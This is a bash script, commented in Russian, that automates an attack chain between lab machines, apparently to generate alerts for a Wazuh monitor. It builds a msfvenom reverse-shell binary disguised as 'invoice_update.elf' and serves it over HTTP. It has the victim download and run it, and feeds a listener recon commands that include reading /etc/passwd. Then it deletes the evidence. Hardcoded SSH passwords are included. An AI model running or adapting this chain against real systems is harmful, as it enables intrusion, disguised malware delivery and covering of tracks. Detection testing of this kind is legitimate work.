#!/bin/bash

KALI_IP="10.0.2.5"
KALI_USER="kali"
KALI_PASS="kali"

UBUNTU_IP="192.168.2.100"
UBUNTU_USER="worker"
UBUNTU_PASS="1qaz2wsx3edc"

LPORT=4444
WEB_PORT=8000
PAYLOAD_NAME="invoice_update.elf"
WAZUH_LOG="/var/ossec/logs/alerts/alerts.json"

SOCKET_DIR="/tmp"
SOCK_KALI="$SOCKET_DIR/mux_kali.sock"
SOCK_UBUNTU="$SOCKET_DIR/mux_ubuntu.sock"

GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

print_step() { echo -e "\n${BLUE}[*] $1...${NC}"; }
print_success() { echo -e "${GREEN}[SUCCESS] $1${NC}"; }
print_error() { echo -e "${RED}[ERROR] $1${NC}"; }

open_connection() {
    local USER=$1
    local IP=$2
    local PASS=$3
    local SOCK=$4
    local NAME=$5

    echo -n "Подключение к $NAME ($IP)... "
    
    # -M: Master mode
    # -S: Путь к сокету
    # -f: Fork (уйти в фон)
    # -N: No command (только держать соединение)
    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -M -S "$SOCK" -f -N "$USER@$IP"
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}OK${NC}"
    else
        echo -e "${RED}FAIL${NC}"
        exit 1
    fi
}

close_connection() {
    local USER=$1
    local IP=$2
    local SOCK=$3
    
    if [ -S "$SOCK" ]; then
        ssh -S "$SOCK" -O exit "$USER@$IP" > /dev/null 2>&1
        rm -f "$SOCK"
    fi
}

# 1. Инициализация сессии 
print_step "Установка постоянных SSH-соединений"

# Очистка старых сокетов, если скрипт падал
rm -f "$SOCK_KALI" "$SOCK_UBUNTU"

open_connection "$KALI_USER" "$KALI_IP" "$KALI_PASS" "$SOCK_KALI" "Kali Linux"
open_connection "$UBUNTU_USER" "$UBUNTU_IP" "$UBUNTU_PASS" "$SOCK_UBUNTU" "Ubuntu Worker"

print_step "Подготовка C2 сервера на Kali с автоматическими командами"

CMDS_FILE="hacker_commands.txt"
CMD_MAKE_COMMANDS="
echo 'echo [HACKER_IN] I am inside!' > $CMDS_FILE
echo 'whoami' >> $CMDS_FILE
echo 'id' >> $CMDS_FILE
echo 'cat /etc/passwd | head -n 3' >> $CMDS_FILE
echo 'ls -la /home' >> $CMDS_FILE
echo 'echo [HACKER_OUT] Bye!' >> $CMDS_FILE
echo 'exit' >> $CMDS_FILE
"
ssh -S "$SOCK_KALI" "$KALI_USER@$KALI_IP" "$CMD_MAKE_COMMANDS"

# 2. Запускаем слушателя, который сразу отправит эти команды подключившемуся
CMD_KALI_PREP="
killall -q python3; killall -q nc;
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI_IP LPORT=$LPORT -f elf > $PAYLOAD_NAME 2>/dev/null;
nohup python3 -m http.server $WEB_PORT > /dev/null 2>&1 &
cat $CMDS_FILE | nohup nc -lvnp $LPORT > /dev/null 2>&1 &
"
ssh -S "$SOCK_KALI" "$KALI_USER@$KALI_IP" "$CMD_KALI_PREP"
print_success "Сервер готов"

sleep 2

# 3. Доставка и эксплуатация
print_step "Kill Chain Phase 2 & 3: Жертва скачивает и запускает файл"
CMD_VICTIM="
wget -q http://$KALI_IP:$WEB_PORT/$PAYLOAD_NAME -O /tmp/$PAYLOAD_NAME;
chmod +x /tmp/$PAYLOAD_NAME;
nohup /tmp/$PAYLOAD_NAME > /dev/null 2>&1 &
"
ssh -S "$SOCK_UBUNTU" "$UBUNTU_USER@$UBUNTU_IP" "$CMD_VICTIM"
print_success "Payload запущен на жертве!"

print_step "Проверка статуса на Kali"

CMD_KALI_CHECK="
ls -l $PAYLOAD_NAME
netstat -antp | grep $LPORT
"
ssh -S "$SOCK_KALI" "$KALI_USER@$KALI_IP" "$CMD_KALI_CHECK"

# 4. Чистка и закрытие сессии
print_step "Удаление улик и закрытие соединений"

ssh -S "$SOCK_UBUNTU" "$UBUNTU_USER@$UBUNTU_IP" "rm -f /tmp/$PAYLOAD_NAME; killall -q $PAYLOAD_NAME"

ssh -S "$SOCK_KALI" "$KALI_USER@$KALI_IP" "killall -q python3; killall -q nc; rm -f $PAYLOAD_NAME"

close_connection "$KALI_USER" "$KALI_IP" "$SOCK_KALI"
close_connection "$UBUNTU_USER" "$UBUNTU_IP" "$SOCK_UBUNTU"

print_success "Работа завершена."